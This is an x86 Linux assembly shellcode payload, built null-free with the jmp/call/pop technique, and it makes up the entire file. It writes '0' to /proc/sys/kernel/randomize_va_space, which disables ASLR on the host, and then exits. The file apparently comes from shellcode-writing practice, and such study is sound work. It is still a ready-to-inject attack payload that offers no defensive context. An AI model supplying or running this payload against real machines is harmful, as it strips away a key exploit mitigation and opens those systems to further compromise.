global _start
section .text

_start:
	; Clear registers
	xor    eax,eax
	; mov ebx, eax		; Value gets popped via jmp/pop/call
	mov ecx, eax
	mov edx, eax
	
	; sys_creat
	; int creat(const char *pathname, mode_t mode);
	; push   eax		; Terminate string with NULL --> not required
	jmp string		; Jump to function string for stringvariable

append:
	pop ebx			; Pop value of string into EBX
	; mov    ebx,esp		; Copy stackpointer to stringvalue in EBX for pathname argument
	mov    cx,0x2bc		; Value for mode argument, 700 --> S_IRWXU
	mov    al,0x8		; sys_create call 0x8
	int    0x80		; syscall
	
	; sys_write
	; ssize_t write(int fd, const void *buf, size_t count);
	mov    ebx,eax		; Copy previously stored FD from creat into EBX
	push   eax		; Push the FD on stack
	mov    dx,0x3a30	; Count value parameter for size
	push   dx		; Put value on stack
	mov    ecx,esp		; Copy the current stackpointer to ECX for buffer argument
	xor    edx,edx		; Clear EDX
	; mov    dx, 0x1		; Set to 1 for size argument
	inc dx
	mov    al,0x4		; Set syscall 0x4 for write
	int    0x80		; syscall
	
	; sys_close
	; int close(int fd);
	; mov    al,0x6		; Close call
	; int    0x80		; syscall, returns zero into EAX
	
	; sys_exit
	; xor eax, eax		; Clear register
	; inc    eax		; Increment for 1
	mov eax, edx		; Copy value 1 from register EDX to EAX
	int    0x80		; syscall exit

string:
	call append
	SomeString: db "/proc/sys/kernel/randomize_va_space"

